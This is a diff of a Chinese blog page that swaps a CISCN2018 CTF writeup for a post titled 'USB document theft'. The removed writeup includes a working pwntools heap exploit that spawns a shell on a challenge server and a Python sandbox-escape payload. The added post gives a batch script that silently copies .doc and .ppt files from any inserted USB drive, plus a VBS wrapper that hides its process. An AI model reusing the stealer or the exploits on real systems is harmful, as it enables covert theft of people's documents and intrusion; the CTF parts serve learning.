@@ -85,7 +85,7 @@
 
 
 
-  <meta name="keywords" content="ctf,writeup," />
+  <meta name="keywords" content="Study," />
 
 
 
@@ -98,32 +98,20 @@
 
 
 
-<meta name="description" content="The Lounge战队 CISCN2018 Writeup">
-<meta name="keywords" content="ctf,writeup">
+<meta name="description" content="检测到插入U盘即复制其中doc、ppt文件到指定目录(ucopy.bat)：">
+<meta name="keywords" content="Study">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CISCN2018 Writeup">
-<meta property="og:url" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/index.html">
+<meta property="og:title" content="U盘文档偷取">
+<meta property="og:url" content="http://yoursite.com/2018/05/28/bat-upan/index.html">
 <meta property="og:site_name" content="Vicen Blog">
-<meta property="og:description" content="The Lounge战队 CISCN2018 Writeup">
+<meta property="og:description" content="检测到插入U盘即复制其中doc、ppt文件到指定目录(ucopy.bat)：">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/0.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/3.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/5.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/6.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/7.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/8.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/9.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/10.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/11.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/12.png">
-<meta property="og:updated_time" content="2018-05-02T11:44:57.468Z">
+<meta property="og:image" content="http://yoursite.com/2018/05/28/bat-upan/1.jpg">
+<meta property="og:updated_time" content="2018-05-27T17:03:22.291Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CISCN2018 Writeup">
-<meta name="twitter:description" content="The Lounge战队 CISCN2018 Writeup">
-<meta name="twitter:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/0.jpg">
+<meta name="twitter:title" content="U盘文档偷取">
+<meta name="twitter:description" content="检测到插入U盘即复制其中doc、ppt文件到指定目录(ucopy.bat)：">
+<meta name="twitter:image" content="http://yoursite.com/2018/05/28/bat-upan/1.jpg">
 
 
 
@@ -153,13 +141,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/04/30/wp-2018-ciscn/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/05/28/bat-upan/"/>
 
 
 
 
 
-  <title>CISCN2018 Writeup | Vicen Blog</title>
+  <title>U盘文档偷取 | Vicen Blog</title>
   
 
 
@@ -330,7 +318,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/30/wp-2018-ciscn/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/bat-upan/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Vicen">
@@ -347,7 +335,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CISCN2018 Writeup</h1>
+          <h1 class="post-title" itemprop="name headline">U盘文档偷取</h1>
         
 
         <div class="post-meta">
@@ -359,8 +347,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-30T02:36:31+08:00">
-                2018-04-30
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T00:46:32+08:00">
+                2018-05-28
               </time>
             
 
@@ -379,8 +367,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/04/30/wp-2018-ciscn/#SOHUCS" itemprop="discussionUrl">
-                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2018/04/30/wp-2018-ciscn/" itemprop="commentsCount"></span>
+                <a href="/2018/05/28/bat-upan/#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2018/05/28/bat-upan/" itemprop="commentsCount"></span>
                 </a>
               
             
@@ -408,35 +396,11 @@
       
 
       
-        <p><img src="/2018/04/30/wp-2018-ciscn/0.jpg" alt=""></p>
-<h1 id="The-Lounge战队-CISCN2018-Writeup"><a href="#The-Lounge战队-CISCN2018-Writeup" class="headerlink" title="The Lounge战队 CISCN2018 Writeup"></a>The Lounge战队 CISCN2018 Writeup</h1><a id="more"></a>
-<h2 id="Pwn-Supermarket"><a href="#Pwn-Supermarket" class="headerlink" title="Pwn-Supermarket"></a>Pwn-Supermarket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(name,price,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;price:&quot;,str(price))</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">def listall():</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def delete(name):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line"></span><br><span class="line">def change_price(name,price):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">	p.sendafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;in:&quot;,str(price))</span><br><span class="line"></span><br><span class="line">def change_des(name,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;5&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">atoi  0xf7643050  0xf75e4050</span><br><span class="line">puts  0xf75f4140  0xf7603140</span><br><span class="line">free  0xf765d750  0xf75af750</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">local=0</span><br><span class="line">if local:</span><br><span class="line">	p=process(&apos;./task_supermarket&apos;)</span><br><span class="line">	libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	atoi_offset=libc.symbols[&apos;atoi&apos;]</span><br><span class="line">	sys_offset=libc.symbols[&apos;system&apos;]</span><br><span class="line">else:</span><br><span class="line">	p=remote(&apos;117.78.27.192&apos;,32285)</span><br><span class="line">	atoi_offset=0x2d050</span><br><span class="line">	sys_offset=0x3a940</span><br><span class="line"></span><br><span class="line">add(&apos;aaaa&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;1111&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;b&apos;*12+&apos;\x41&apos;,100,0x38,&apos;B&apos;*0x38)</span><br><span class="line">add(&apos;cccc&apos;,100,0x60,&apos;C&apos;*0x60)</span><br><span class="line">add(&apos;dddd&apos;,100,0x20,&apos;D&apos;*0x20)</span><br><span class="line">delete(&apos;b&apos;*12+&apos;\x41&apos;)</span><br><span class="line">change_des(&apos;cccc&apos;,0x20,&apos;M&apos;*0x24+p32(0x41))</span><br><span class="line"></span><br><span class="line">add(&apos;eeee&apos;,100,0x38,&apos;EEEE&apos;)</span><br><span class="line">add(&apos;ffff&apos;,100,0x38,p32(101)+p32(0x38)+p32(0x804b048)+p32(0x41))</span><br><span class="line">listall()</span><br><span class="line">p.recvuntil(&quot;101, des.&quot;)</span><br><span class="line"></span><br><span class="line">data=p.recv(4)</span><br><span class="line">print data</span><br><span class="line">atoi_addr=u32(data.ljust(4,&apos;\x00&apos;))</span><br><span class="line">print hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atoi_addr-atoi_offset</span><br><span class="line">system=libc_base+sys_offset</span><br><span class="line">print &quot;system&quot;,hex(system)</span><br><span class="line"></span><br><span class="line">change_des(&apos;eeee&apos;,0x38,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Web-EasyWeb"><a href="#Web-EasyWeb" class="headerlink" title="Web-EasyWeb"></a>Web-EasyWeb</h2><p>无力吐槽的题目，空密码。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/1.png" alt="">  </p>
-<p><img src="/2018/04/30/wp-2018-ciscn/2.png" alt="">  </p>
-<h2 id="Crypto-Flag-in-your-hand"><a href="#Crypto-Flag-in-your-hand" class="headerlink" title="Crypto-Flag_in_your_hand"></a>Crypto-Flag_in_your_hand</h2><p>基本逻辑很简单，看showFlag函数。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/3.png" alt="">  </p>
-<p>判断ic状态来决定是否是正确Token。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/4.png" alt="">  </p>
-<p>文件唯一有改动ic的地方就是这了，看一下逻辑。就是a数组所有值-3转成ASCII字符就是正确Token。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/5.png" alt="">  </p>
-<h2 id="Misc-寻找入侵者"><a href="#Misc-寻找入侵者" class="headerlink" title="Misc-寻找入侵者"></a>Misc-寻找入侵者</h2><p>用mac地址爆破出honey密码</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/6.png" alt=""></p>
-<p><img src="/2018/04/30/wp-2018-ciscn/7.png" alt="">    </p>
-<p>然后使用airdecap-ng提取出另一个数据包，在包里面发现出题人博客以及key.rar的下载地址，下载后解压得到key.pcap，发现可疑字符串，即为flag</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/8.png" alt="">  </p>
-<h2 id="Misc-Memory-Forensic"><a href="#Misc-Memory-Forensic" class="headerlink" title="Misc-Memory_Forensic"></a>Misc-Memory_Forensic</h2><p>很荣幸是三血。其实能更快。首先用IDA看一下逻辑。发现已经出现了”CISCN{“ “}” 和几个疑似flag的字符串，然后他会用snprintf去写内存，那么真flag应该会出现在内存中。<br>我是用的Vmware14配Mac OS High Siera，这样能拿到完整内存Dump。首先关闭System Integrity Protection，然后kextutil agent.kext加载，然后它会黑屏，在黑屏一瞬间切出去，暂停虚拟机。拿到整个内存Dump。然后用16进制编辑器搜索“CISCN{”就行。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/9.png" alt="">  </p>
-<h2 id="Misc-Picture"><a href="#Misc-Picture" class="headerlink" title="Misc-Picture"></a>Misc-Picture</h2><p>首先给了个假的PNG，其实是JPG。FFD9结尾处有数据，提出来，file一下发现是zlib数据，然后直接binwalk解压，给了个Base64字符串，解密后是KP什么的，还有Python code，当时想偏了，以为是PYC文件，修了半天发现格式全错。后来把头部改成PK，是个正常的ZIP文件。然后要密码。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/10.png" alt="">  </p>
-<p>注意右边注释，Python控制台报错？试一下。</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/11.png" alt="">  </p>
-<p>没错，integer division or modulo by zero这是密码。成功解压后是个UUEncode，解密就行了。</p>
-<h2 id="Misc-验证码"><a href="#Misc-验证码" class="headerlink" title="Misc-验证码"></a>Misc-验证码</h2><p>没啥好说的，签到题，进去就有flag。</p>
-<h2 id="Misc-RUN"><a href="#Misc-RUN" class="headerlink" title="Misc-RUN"></a>Misc-RUN</h2><p>Python沙箱逃逸，试了很多Payload。所有的popen都会报unkonw error。所有的二阶<strong>dict</strong>也会报错，后来想到找一个<strong>globals</strong>。<br>x = [x for x in [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() if x.<strong>name</strong> == ‘ca’+’tch_warnings’][0].<strong>init</strong><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s /home/ctf&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;ca&#39;+&#39;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;">‘sy’+’stem’</a></p>
-<h2 id="Reverse-RE"><a href="#Reverse-RE" class="headerlink" title="Reverse-RE"></a>Reverse-RE</h2><p>程序先检测flag格式头，然后根据“_”将内容分为三个部分，分别加密之后与字符串比较，前两个部分的内容很容易得到，解开md5值为tofu和gana，第三部分flag的MD5无法解开，卡了两三个小时，看到第三个函数与其他两个的区别是后面将大量数据写到一个叫“flag”的文件中，但是需要异或的两个key值，分别和数据奇数项和偶数项异或，因为看到第一个数据和第三个数据相同，猜测文件是jepg格式，果然解出来是张图片，连在一起即为完整flag.</p>
-<p><img src="/2018/04/30/wp-2018-ciscn/12.png" alt="">  </p>
-
+        <p><img src="/2018/05/28/bat-upan/1.jpg" alt="">  </p>
+<h2 id="检测到插入U盘即复制其中doc、ppt文件到指定目录"><a href="#检测到插入U盘即复制其中doc、ppt文件到指定目录" class="headerlink" title="检测到插入U盘即复制其中doc、ppt文件到指定目录"></a>检测到插入U盘即复制其中doc、ppt文件到指定目录</h2><p>(ucopy.bat)：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">:again</span><br><span class="line">del /Q /f &quot;%temp%\copy.tmp&quot; &gt;nul 2&gt;nul</span><br><span class="line">for %%i in (d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do @fsutil fsinfo drivetype %%i: &gt;&gt;&quot;%temp%\copy.tmp&quot;</span><br><span class="line">findstr /i &quot;可移动驱动器&quot; &quot;%temp%\copy.tmp&quot; </span><br><span class="line">if errorlevel==1 goto end</span><br><span class="line">if errorlevel==0 goto copy </span><br><span class="line">:end </span><br><span class="line">echo 不存在</span><br><span class="line">ping 127.0.0.1 -n 20 &gt;nul 2&gt;nul</span><br><span class="line">goto again</span><br><span class="line">:copy</span><br><span class="line">if exist c:\copy goto goon</span><br><span class="line">cd\</span><br><span class="line">cd /d c:</span><br><span class="line">md copy  </span><br><span class="line">:goon</span><br><span class="line">for /f &quot;tokens=1&quot; %%i in (&apos;findstr /i &quot;可移动驱动器&quot; &quot;%temp%\copy.tmp&quot;&apos;) do (</span><br><span class="line">for /f &quot;tokens=*&quot; %%j in (&apos;dir/s/b %%i\*.ppt %%i\*.doc?&apos;) do (</span><br><span class="line">copy %%j c:\copy /y))</span><br><span class="line">ping 127.0.0.1 -n 20 &gt;nul 2&gt;nul</span><br><span class="line">goto again</span><br></pre></td></tr></table></figure></p>
+<h2 id="隐藏bat进程"><a href="#隐藏bat进程" class="headerlink" title="隐藏bat进程"></a>隐藏bat进程</h2><p>(ucopy.vbs)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set ws=WScript.CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line">ws.Run &quot;u.bat&quot;,0</span><br></pre></td></tr></table></figure>
+<h2 id="执行ucopy-vbs"><a href="#执行ucopy-vbs" class="headerlink" title="执行ucopy.vbs"></a>执行ucopy.vbs</h2>
       
     </div>
     
@@ -482,9 +446,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-          
-            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+            <a href="/tags/Study/" rel="tag"><i class="fa fa-tag"></i> Study</a>
           
         </div>
       
@@ -497,8 +459,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/30/mips/" rel="next" title="mips程序调试">
-                <i class="fa fa-chevron-left"></i> mips程序调试
+              <a href="/2018/05/26/termux-study/" rel="next" title="安卓终端-termux">
+                <i class="fa fa-chevron-left"></i> 安卓终端-termux
               </a>
             
           </div>
@@ -506,10 +468,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/02/heap-study/" rel="prev" title="堆学习（一）">
-                堆学习（一） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -858,7 +816,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Lounge战队-CISCN2018-Writeup"><span class="nav-number">1.</span> <span class="nav-text">The Lounge战队 CISCN2018 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-Supermarket"><span class="nav-number">1.1.</span> <span class="nav-text">Pwn-Supermarket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-EasyWeb"><span class="nav-number">1.2.</span> <span class="nav-text">Web-EasyWeb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-Flag-in-your-hand"><span class="nav-number">1.3.</span> <span class="nav-text">Crypto-Flag_in_your_hand</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-寻找入侵者"><span class="nav-number">1.4.</span> <span class="nav-text">Misc-寻找入侵者</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-Memory-Forensic"><span class="nav-number">1.5.</span> <span class="nav-text">Misc-Memory_Forensic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-Picture"><span class="nav-number">1.6.</span> <span class="nav-text">Misc-Picture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-验证码"><span class="nav-number">1.7.</span> <span class="nav-text">Misc-验证码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-RUN"><span class="nav-number">1.8.</span> <span class="nav-text">Misc-RUN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-RE"><span class="nav-number">1.9.</span> <span class="nav-text">Reverse-RE</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#检测到插入U盘即复制其中doc、ppt文件到指定目录"><span class="nav-number">1.</span> <span class="nav-text">检测到插入U盘即复制其中doc、ppt文件到指定目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏bat进程"><span class="nav-number">2.</span> <span class="nav-text">隐藏bat进程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行ucopy-vbs"><span class="nav-number">3.</span> <span class="nav-text">执行ucopy.vbs</span></a></li></ol></div>
             
 
           </div>
